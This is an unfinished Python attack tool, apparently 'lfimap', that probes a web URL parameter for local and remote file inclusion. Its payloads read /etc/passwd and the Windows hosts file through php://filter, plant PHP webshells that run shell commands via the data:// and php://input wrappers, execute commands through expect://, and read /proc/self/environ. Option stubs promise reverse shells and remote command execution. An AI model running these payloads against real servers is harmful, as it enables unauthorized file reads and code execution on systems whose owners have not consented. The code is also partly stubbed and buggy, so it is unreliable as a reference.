#!/usr/bin/env python3

import os
import sys
import re
import socket
import subprocess
import random
import argparse
import requests
import requests.exceptions
import base64

from argparse import RawTextHelpFormatter
from urllib.parse import urlsplit
from urllib.parse import urlparse

#proxies = {}

exploits = []
exploit = {'REQUST_TYPE': '',
               'EXPLOIT_TYPE': '',
           'GETVAL':'',
           'POSTVAL':'',
           'HEADERS':''}
SYSINFO = {'OS_NAME': '',
              'OS_VERSION':'',
              'BITNESS':'',
              'ENV_VARS':''
        }
USRINFO = {}
#awk -F: '/\/home/ && ($3 >= 1000) {printf "%s:%s\n",$1,$3}' /etc/passwd

PROCINFO = {}
SOFTWINFO = {}
NETINFO = {''}
def prepareHeaders():
    user_agents = [
                ":Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
                ":Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
                ":Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
                ":Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
                ":Mozilla/3.01 (Macintosh; PPC)",
                ":Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",
                ":Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
                ":Opera/8.00 (Windows NT 5.1; U; en)",
                ":Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
                  ]                                                                                                                                                                             
                                                                                                                                                                                                
    headers = {}                                                                                                                                                                                
    if(args.agent):                                                                                                                                                                  headers['User-Agent'] = ":" + agent                                                                                                                                                     
    else:                                                                                                                                                                    
        headers['User-Agent'] = random.choice(user_agents)                                                                                                                                      
    if(args.referer):
        headers['Referer'] = ':' + referer
    
    headers['Accept-Language'] = ':en-US;'
    headers['Accept-Encoding'] = ':gzip, deflate'
    headers['Accept'] = ':text/html,application/xhtml+xml,application/xml;'
    headers['Connection'] = ':Close'
    
    return headers

def addHeader(newKey, newVal):
    headers[newKey] = newVal

def getExploit(req, request_type, exploit_type, getVal, postVal, headers):
    global exploits
    e = {}
    e['REQUEST_TYPE'] = request_type
    e['EXPLOIT_TYPE'] = exploit_type
    e['GETVAL'] = getVal
    e['POSTVAL'] = postVal
    e['HEADERS'] = req.headers
    exploits.append(e)

    return e

def test_wordlist(url):
    f = open(wordlist, "r")
    
    for line in f:
        line = line[:-1]
        if("DESTROY" in url):
            u = url.replace("DESTROY", line)

        res = requests.get(u, headers = headers)
        
        if(checkPayload(res)):
            getExploit(res, 'GET', 'LFI', u, '', headers)
            print("[+] LFI -> " + u)
            return  #To prevent further traffic

    f.close()

def test_php_filter(url):
    testL = []
    testL.append("php://filter/resource=/etc/passwd")
    testL.append("php://filter/convert.base64-encode/resource=/etc/passwd")
    testL.append("php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd")
    testL.append("php://filter/read=string.rot13/resource=/etc/passwd")
    
    testW = []
    testW.append("php://filter/resource=C:/Windows/System32/drivers/etc/hosts")
    testW.append("php://filter/convert.base64-encode/resource=C:/Windows/System32/drivers/etc/hosts")
    testW.append("php://filter/convert.iconv.utf-8.utf-16/resource=C:/Windows/System32/drivers/etc/hosts")
    testW.append("php://filter/read=string.rot13/resource=C:/Windows/System32/drivers/etc/hosts")
    
    #Linux
    for i in range(len(testL)):
        if("DESTROY" in url):
            u = url.replace("DESTROY", testL[i])

        res = requests.get(u, headers = headers)
        if(checkPayload(res)):
            getExploit(res, 'GET', 'LFI', u, '', headers)
            print("[+] LFI -> " + u)
    
    #Windows
    for i in range(len(testW)):
        u = url.replace("DESTROY", testW[i])
    
        res = requests.get(u, headers = headers)
        if(checkPayload(res)):
            getExploit(res, 'GET', 'LFI', u, '', headers)
            print("[+] LFI -> " + u)


#OK
def test_data_wrapper(url):
    testL = []
    testL.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20/etc/passwd")
    testW = []
    testW.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=ipconfig")
    
    #Linux
    for i in range(len(testL)):
        if("DESTROY" in url):
            u = url.replace("DESTROY", testL[i])
        res = requests.get(u, headers = headers)
    
        if(checkPayload(res)):
            getExploit(res, 'GET', 'LFI', u, '', headers)
            print("[+] LFI -> " + u)
    
    #Windows
    for i in range(len(testW)):
        if("DESTROY" in url):
            u = url.replace("DESTROY", testW[i])
        res = requests.get(u, headers = headers)

        if(checkPayload(res)):
            getExploit(res, 'GET', 'LFI', u, '', headers)
            print("[+] LFI -> " + u)

#OK
def test_php_input(url):
    testL = []
    testL.append("php://input&cmd=cat%20/etc/passwd")
    
    testW = []
    testW.append("php://input&cmd=ipconfig")
    
    posts = []
    posts.append("<?php echo shell_exec($_GET['cmd']) ?>")
    posts.append("<? system('cat /etc/passwd');echo exec($_GET['cmd']);?>")
    
    #Linux
    for i in range(len(testL)):
        if("DESTROY" in url):
            u = url.replace("DESTROY", testL[i])
    
        for j in range(len(posts)):
            res = requests.post(u, headers = headers, data=posts[j])
            if(checkPayload(res)):
                print("[+] RCE -> " + u + " -> HTTP POST: " + posts[j])
                if(args.en_sys):
                    enumerate_system(getExploit(res, 'POST', 'RCE', u, posts[j], headers))

    #Windows
    for k in range(len(testW)):
        if("DESTROY" in url):
            u = url.replace("DESTROY", testW[k])
        
        for l in range(len(posts)):
            res = requests.post(u, headers = headers, data = posts[l])
            if(checkPayload(res)):
                getExploit(res, 'POST', 'RCE', u, posts[l], headers)
                print("[+] RCE -> " + u + " -> HTTP POST: " + posts[l])

#OK
def test_expect_wrapper(url):
    testL = []
    testL.append("expect://cat%20%2Fetc%2Fpasswd")
    
    testW = []
    testW.append("expect://ipconfig")

    #Linux
    for i in range(len(testL)):
        if("DESTROY" in url):
            u = url.replace("DESTROY", testL[i])

        res = requests.get(u, headers = headers)
        if(checkPayload(res)):
            getExploit(res, 'GET', 'RCE', u, testL[i], headers)
            print("[+] RCE -> " + u)

    #Windows
    for j in range(len(testW)):
        if("DESTROY" in url):
            u = url.replace("DESTROY", testW[j])

        res = requests.get(u, headers = headers)
        if(checkPayload(res)):
            getExploit(res, 'GET', 'RCE', u, testW[j], headers)
            print("[+] RCE -> " + u)

#OK
def test_rfi(url):
    tests = []
    tests.append("https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2FREADME.md")
    for i in range(len(tests)):
        if("DESTROY" in url):
            u = url.replace("DESTROY", tests[i])
        try:
            res = requests.get(u, headers = headers, timeout = 2)
            if(checkPayload(res)):
                getExploit(res, 'GET', 'RFI', u, tests[i], headers)
                print("[+] RFI -> " + u)
        except:
            pass

def test_environ(url):
    tests = []
    tests.append("/proc/self/environ")
    
    for i in range(len(tests)):
        if("DESTROY" in url):
            u = url.replace("DESTROY", tests[i])

            res = requests.get(u, headers = headers)
            if(checkPayload(res)):
                getExploit(res, 'GET', 'LFI', u, tests[i], headers)
                print("[+] LFI -> " + u)

#You can add custom patterns in responses depending on the wordlist used
#Checks if sent payload is executed
def checkPayload(webResponse):
    KEY_WORDS = ["root:x:0:0", "www-data:", "HTTP_USER_AGENT",
                "cm9vdDp4OjA6MD", "Ond3dy1kYXRhO", "ebbg:k:0:0",
                "jjj-qngn:k", "daemon:x:1:", "r o o t : x : 0 : 0",
                "; for 16-bit app support", "sample HOSTS file used by Microsoft",
                "Windows IP Configuration", "OyBmb3IgMT", "; sbe 16-ovg ncc fhccbeg",
                ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
                "c2FtcGxlIEhPU1RT", "=1943785348b45", "SUDO_UID", "/usr/bin/",
                "root"]

    for i in range(len(KEY_WORDS)):
        if KEY_WORDS[i] in webResponse.text:
            return True
    return False

def enumerate_system(exploit):
    #Linux
    print("Enum_sys")
    

def main():
    global exploits

    #Perform all tests
    if(test_all):
        test_php_filter(url)
        test_php_input(url)
        test_data_wrapper(url)
        test_expect_wrapper(url)
        test_rfi(url)
        test_environ(url)
        test_wordlist(url)
        
        print("Done.")
        sys.exit(0)

    default = True
    if(args.wordlist):
        default = False
        test_wordlist(url)
    if(php_filter):
        default = False
        test_php_filter(url)
    if(php_input):
        default = False
        test_php_input(url)
    if(data_wrapper):
        default = False
        test_data_wrapper(url)
    if(expect_wrapper):
        default = False
        test_expect_wrapper(url)
    if(args.rfi):
        default = False
        test_rfi(url)
    if(args.environ): #This should be last
        default = False  
        test_environ(url)

    #Default behaviour
    if(default):
        test_php_filter(url)
        test_php_input(url)
        test_data_wrapper(url)
        test_expect_wrapper(url)
        test_rfi(url)

    print("Done.")
    exit(0)

#def enumerate_system(url, payload):
    #Get os name, bitness, kernel version, env variables

    #If payload is not provided, use os detection using other methods
    #os info using nmap?

if(__name__ == "__main__"):
    
    print("")
    parser = argparse.ArgumentParser(description="lfimap, LFI discovery and exploitation tool", formatter_class=RawTextHelpFormatter, add_help=False)

    optionsGroup = parser.add_argument_group('GENERAL')
    optionsGroup.add_argument('url', type=str, metavar="URL", help="""\t\t Specify url, Ex: "http://example.org/vuln.php?param=DESTROY" ###DONE""")
    optionsGroup.add_argument('-c', type=str, metavar="<cookie>", dest='cookie', help='\t\t Specify session cookie, Ex: "PHPSESSID=1943785348b45" ###DONE')
    optionsGroup.add_argument('--proxy-ip', type=str, metavar = "<IP>", dest="proxyIp", help="\t\t Specify Proxy IP address")
    optionsGroup.add_argument('--proxy-port', type=int, metavar="<PORT>", dest="proxyPort", help="\t\t Specify Proxy port number")
    optionsGroup.add_argument('--useragent', type=str, metavar= '<agent>', dest="agent", help="\t\t Specify HTTP user agent ###DONE")
    optionsGroup.add_argument('--referer', type=str, metavar = '<referer>', dest='referer', help="\t\t Specify HTTP referer ###DONE")
    
    attackGroup = parser.add_argument_group('ATTACK TECHNIQUE')
    attackGroup.add_argument('--php-filter', action="store_true", dest = 'php_filter', help="\t\t Attack using php filter wrapper ###DONE")
    attackGroup.add_argument('--php-input', action="store_true", dest = 'php_input', help="\t\t Attack using php input wrapper ###DONE")
    attackGroup.add_argument('--php-data', action="store_true", dest = 'php_data', help="\t\t Attack using php data wrapper ###DONE")
    attackGroup.add_argument('--php-expect', action="store_true", dest = 'php_expect', help="\t\t Attack using php expect wrapper ###DONE")
    attackGroup.add_argument('--php-zip', action = "store_true", dest= 'php_zip', help="\t\t Attack using php zip wrapper")
    attackGroup.add_argument('--php-session', action="store_true", dest= "php_session", help="\t\t Attack using session id injection")
    attackGroup.add_argument('--phpinfo-race', action="store_true", dest="phpinfo_race", help="\t\t Attack using phpinfo race condition")
    attackGroup.add_argument('--log-poison', action="store_true", dest="log_poison", help="\t\t Attack using log file poisoning")
    attackGroup.add_argument('--self-fd', action="store_true", dest="self_fd", help="\t\t Attack using '/proc/self/fd' technique")
    attackGroup.add_argument('--self-environ', action = "store_true", dest='environ', help="\t\t Attack using '/proc/self/environ' injection ###TODO TEST")
    attackGroup.add_argument('--rfi', action = "store_true", dest='rfi', help="\t\t Attack using remote file inclusion ###TODO IMPROVE")
    attackGroup.add_argument('-w', type=str, metavar="<wordlist>", dest='wordlist', help="\t\t Specify wordlist for attack (default wordlist.txt) ###DONE")
    attackGroup.add_argument('-a', '--attack-all', action="store_true", dest = 'test_all', help="\t\t Use all available methods to compromise a target")
   

    postExpGroup = parser.add_argument_group('ENUMERATE')
    postExpGroup.add_argument('--enumerate-system', action="store_true", dest="en_sys", help="\t\t Enumerate target system info")
    postExpGroup.add_argument('--enumerate-users', action="store_true", dest="en_usr", help="\t\t Enumerate target users info")
    postExpGroup.add_argument('--enumerate-process', action="store_true", dest="en_proc", help="\t\t Enumerate target process info")
    postExpGroup.add_argument('--enumerate-network', action="store_true", dest="en_net", help="\t\t Enumerate target network info")
    postExpGroup.add_argument('--enumerate-files', action="store_true", dest="en_file", help="\t\t Enumerate target file info")
    postExpGroup.add_argument('--enumerate-shares', action="store_true", dest="en_share", help="\t\t Enumerate target share info")
    
    payloadGroup = parser.add_argument_group('PAYLOAD')
    payloadGroup.add_argument('-s', '--spawn-shell', action="store_true", dest="spawn_shell", help="\t\t Spawn reverse shell connection")
    payloadGroup.add_argument('-x', type=str, metavar = "<command>", dest="x", help= "\t\t Execute command on remote computer")
    
    otherGroup = parser.add_argument_group('OTHER')
    otherGroup.add_argument('-v', '--verbose', action="store_true", dest="verbose", help="\t\t Verbose output\n")
    otherGroup.add_argument('-h', '--help', action="help", default=argparse.SUPPRESS, help="\t\t Print this help message ###DONE")
    args = parser.parse_args()

    url = args.url
    php_filter = args.php_filter
    data_wrapper = args.php_data
    expect_wrapper = args.php_expect
    php_input = args.php_input
    cookie = args.cookie
    wordlist = args.wordlist
    test_all = args.test_all
    agent = args.agent
    referer = args.referer
    environ = args.environ
    rfi = args.rfi

    print("TODO: On every attack method, payload list")

    #Checks URL arg
    urlRegex = re.compile(
    r'^(?:http|ftp)s?://' # http:// or https:// or ftp://
    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
    r'localhost|' #localhost...
    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
    r'(?::\d+)?' # optional port
    r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    
    
    if("DESTROY" not in url):
        print("Please use DESTROY as a vulnerable parameter value that you want to exploit\n")
        sys.exit(-1)

    if(not cookie):
        print("WARNING: Cookie argument ('-c') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.\n")
    
    if(re.match(urlRegex, url) is None):
        print("URL not valid, exiting...")
        sys.exit(-1)

    #Checks if provided wordlist arg exists, in main is selects wordlist based on target OS type
    if(wordlist is not None):
        if(not os.path.isfile(wordlist)):
            print("Specified wordlist doesn't exist. Exiting...")
            sys.exit(-1)
    else:
        wordlist = "wordlist.txt"
     
    headers = prepareHeaders()

    if(cookie is not None):
        addHeader('Cookie', cookie)

    main()